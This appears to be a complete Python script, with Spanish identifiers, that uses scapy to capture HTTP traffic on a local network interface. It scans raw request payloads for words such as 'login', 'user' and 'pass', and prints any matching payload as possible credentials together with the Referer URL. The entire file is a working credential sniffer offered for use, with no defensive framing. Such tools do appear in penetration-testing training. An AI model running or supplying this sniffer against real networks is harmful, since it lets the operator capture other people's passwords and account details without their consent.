#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http
from termcolor import colored
import signal
import os

def senial(s,f):
    print(colored("[!] Saliendo", color="red"))
    os._exit(1)


signal.signal(signal.SIGINT, senial)

def proces_pk(pk):

    credenciales = ["login", "user", "pass", "mail"]

    if pk.haslayer(http.HTTPRequest):
        if pk.haslayer(scapy.Raw):

            try:
                responce = pk[scapy.Raw].load.decode()
                url = pk[http.HTTPRequest].Referer.decode()

                for i in credenciales:
                    if i in responce:
                        print(f"\n{colored("[+]", color="yellow")} {colored("Posibles credenciales", color="dark_grey")} {colored(responce, color="green")}")
                        print(f"{colored("[+] URL -> ", color="magenta")}{colored(url, "blue")}")
                        break
            except:
                pass


def sniff(interface):
    scapy.sniff(iface=interface, prn=proces_pk, store=0)

def main():
    sniff("enp6s0")

if __name__ == "__main__":
    main()
